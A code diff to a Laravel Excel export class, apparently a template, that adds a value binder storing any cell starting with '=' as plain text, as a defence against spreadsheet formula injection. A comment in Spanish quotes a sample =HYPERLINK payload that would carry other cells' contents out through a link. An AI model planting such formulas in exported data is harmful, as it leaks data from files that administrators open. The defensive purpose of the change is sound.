@@ -6,8 +6,12 @@ use Namespace\Models\PascalCaseModelName;
 use Innoboxrr\SearchSurge\Search\Builder;
 use Illuminate\Contracts\View\View;
 use Maatwebsite\Excel\Concerns\FromView;
+use Maatwebsite\Excel\Concerns\WithCustomValueBinder;
+use Maatwebsite\Excel\DefaultValueBinder;
+use PhpOffice\PhpSpreadsheet\Cell\Cell;
+use PhpOffice\PhpSpreadsheet\Cell\DataType;
 
-class PluralPascalCaseModelNameExports implements FromView
+class PluralPascalCaseModelNameExports extends DefaultValueBinder implements FromView, WithCustomValueBinder
 {
 
     public function __construct(protected array $data)
@@ -34,6 +38,29 @@ class PluralPascalCaseModelNameExports implements FromView
         // lazy() en vez de get(): un export recorre la tabla entera y
         // hidratar todas las filas a la vez es lo que revienta la memoria.
         return $builder->lazy(PascalCaseModelName::class, $this->data);
+    }
+
+    /**
+     * Lo que empieza por `=` se guarda como texto, no como fórmula.
+     *
+     * PhpSpreadsheet convierte en fórmula cualquier celda que empiece por `=`,
+     * y lo que se exporta lo escribieron los usuarios. Quien guardara un título
+     * como `=HYPERLINK("https://..."&B2;"Ver")` dejaba en el archivo que abre
+     * el administrador un enlace que se lleva el contenido de otras celdas. El
+     * resto de valores se tipa como siempre: los números siguen siendo números.
+     *
+     * Hereda el binder de Laravel Excel, no el de PhpSpreadsheet: es el que
+     * Laravel Excel usa por omisión y el que pasa los arrays a JSON.
+     */
+    public function bindValue(Cell $cell, mixed $value): bool
+    {
+        if (is_string($value) && str_starts_with($value, '=')) {
+            $cell->setValueExplicit($value, DataType::TYPE_STRING);
+
+            return true;
+        }
+
+        return parent::bindValue($cell, $value);
     }
 
 }
